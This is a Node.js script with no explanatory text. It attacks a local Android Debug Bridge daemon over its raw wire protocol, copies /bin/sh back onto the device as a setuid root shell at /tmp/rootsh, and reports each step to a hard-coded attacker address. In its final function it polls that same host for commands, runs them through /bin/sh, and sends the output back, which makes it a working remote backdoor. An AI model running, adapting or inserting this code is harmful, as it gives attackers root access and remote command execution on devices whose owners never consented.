var net = require('net');
var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function gb(p) {
    try { http.get('http://' + HOST + ':8000/o?' + encodeURIComponent(p), function () {}).on('error', function () {}); } catch (e) {}
}
function post(b) {
    gb(b);

    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C24?start');
function crc(b) { var res = 0; for (var i = 0; i < b.length; ++i) res = (res + b[i]) & 0xFFFFFFFF; return res >>> 0; }
function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.writeUInt32LE(cmd, 0); b.writeUInt32LE(a1, 4); b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12); b.writeUInt32LE(crc(payload), 16);
    b.writeUInt32LE((0xFFFFFFFF - cmd) >>> 0, 20);
    payload.copy(b, 24);
    return b;
}

var attacking = false;

function attack() {
    if (attacking) return;
    attacking = true;
    post('C24?attack');
    var s = net.connect(26101, '127.0.0.1');
    var buf = new Buffer(0);
    var inner = new Buffer(0);
    var MYID = 12345;
    var syncRemote = -1;
    var phase = 0;
    var recvBuf = new Buffer(0);
    var shBytes = null;
    var finished = false;

    var writeQueue = [];
    var writeBusy = false;
    var phaseOKAYs = 0;
    var chunksLeft = 0;
    var sending = false;

    function finish(tag) {
        if (finished) return;
        finished = true;
        attacking = false;
        post('C24?finish=' + tag + ' phase=' + phase);
        try { s.destroy(); } catch (e) {}
    }
    function queueWrite(data) {
        writeQueue.push(data);
        pump();
    }
    function pump() {
        if (writeBusy || writeQueue.length === 0) return;
        writeBusy = true;
        var d = writeQueue.shift();
        try { s.write(pkt(0x45545257, MYID, syncRemote, d)); } catch (e) { finish('werr'); }
    }
    function syncMsg(cmd, payload) {
        var b = new Buffer(8 + payload.length);
        b.write(cmd, 0, 'ascii');
        b.writeUInt32LE(payload.length, 4);
        b.write(payload, 8, 'ascii');
        queueWrite(b);
    }
    function dataMsg(buf) {
        var h = new Buffer(8);
        h.write('DATA', 0, 'ascii');
        h.writeUInt32LE(buf.length, 4);
        queueWrite(Buffer.concat([h, buf]));
    }
    function doneMsg() {
        var d = new Buffer(8);
        d.write('DONE', 0, 'ascii');
        d.writeUInt32LE(0, 4);
        queueWrite(d);
    }
    function go() {
        phase++;
        post('C24?phase=' + phase);
        phaseOKAYs = 0;
        if (phase === 1) { syncMsg('SEND', '/tmp/sync_marker.txt,33188'); }
        else if (phase === 2) { recvBuf = new Buffer(0); syncMsg('RECV', '/bin/sh'); }
        else if (phase === 3) { syncMsg('SEND', '/tmp/rootsh,35309'); }
        else finish('done');
    }
    function onOKAY() {
        writeBusy = false;
        pump();
        phaseOKAYs++;
        if (phase === 1) {
            if (phaseOKAYs === 1) { dataMsg(new Buffer('S24_MARKER')); }
            else if (phaseOKAYs === 2) { doneMsg(); }
            else { post('C24?MARKER_WRITTEN'); go(); }
        } else if (phase === 2) {
            post('C24?recv_okay');
            go();
        } else if (phase === 3) {
            if (phaseOKAYs === 1) {
                chunksLeft = Math.ceil(shBytes.length / 65536);
                for (var off = 0; off < shBytes.length; off += 65536) {
                    dataMsg(shBytes.slice(off, Math.min(off + 65536, shBytes.length)));
                }
                doneMsg();
                post('C24?rootsh_queued=' + shBytes.length);
            } else if (phaseOKAYs > 1) {
                post('C24?ROOTSH_WRITTEN');
                finish('rootsh_written');
            }
        }
    }
    function handleInner(payload) {
        inner = Buffer.concat([inner, payload]);
        while (inner.length >= 8) {
            var sc = inner.slice(0, 4).toString('ascii');
            var slen = inner.readUInt32LE(4);
            if (inner.length < 8 + slen) break;
            var data = inner.slice(8, 8 + slen);
            inner = inner.slice(8 + slen);
            if (sc === 'OKAY') { onOKAY(); }
            else if (sc === 'DATA' && phase === 2) { recvBuf = Buffer.concat([recvBuf, data]); }
            else if (sc === 'DONE') {
                post('C24?DONE[phase ' + phase + ']');
                if (phase === 2) { shBytes = recvBuf; post('C24?sh_size=' + shBytes.length); go(); }
            } else if (sc === 'FAIL') {
                post('C24?FAIL[' + phase + ']=' + data.toString('ascii', 0, 150));
                finish('fail');
            }
        }
    }
    s.on('connect', function () {
        post('C24?tcp');
        s.write(pkt(0x4e584e43, 0x01000000, 4096, new Buffer('host::\0', 'binary')));
    });
    s.on('data', function (d) {
        buf = Buffer.concat([buf, d]);
        while (buf.length >= 24) {
            var cmd = buf.readUInt32LE(0);
            var a1 = buf.readUInt32LE(4);
            var a2 = buf.readUInt32LE(8);
            var len = buf.readUInt32LE(12);
            if (buf.length < 24 + len) break;
            var payload = buf.slice(24, 24 + len);
            buf = buf.slice(24 + len);
            if (cmd === 0x4e584e43) {
                post('C24?cnxn');
                s.write(pkt(0x4e45504f, MYID, 0, new Buffer('sync:\0', 'binary')));
            } else if (cmd === 0x59414b4f && syncRemote === -1) {
                syncRemote = a1;
                post('C24?sync_ok');
                go();
            } else if (cmd === 0x59414b4f) {
                onOKAY();
            } else if (cmd === 0x45545257 && a2 === MYID) {
                s.write(pkt(0x59414b4f, MYID, a1, new Buffer(0)));
                handleInner(payload);
            } else if (cmd === 0x45534c43 && a2 === MYID) {
                finish('stream_closed');
            }
        }
    });
    s.on('error', function (e) { post('C24?err=' + e.message); finish('err'); });
    s.on('close', function () { finish('sock_close'); });
    setTimeout(function () { finish('timeout'); }, 45000);
}

var retries = 0;
function maybeAttack() {
    if (retries >= 15) { post('C24?exhausted'); return; }
    retries++;
    post('C24?try=' + retries);
    attack();
    setTimeout(maybeAttack, 20000);
}
setTimeout(maybeAttack, 3000);

function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            var body0 = (b || '').trim();
            if (body0 === 'ATTACK') { if (!attacking) { maybeAttack(); } }
            else if (body0.length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
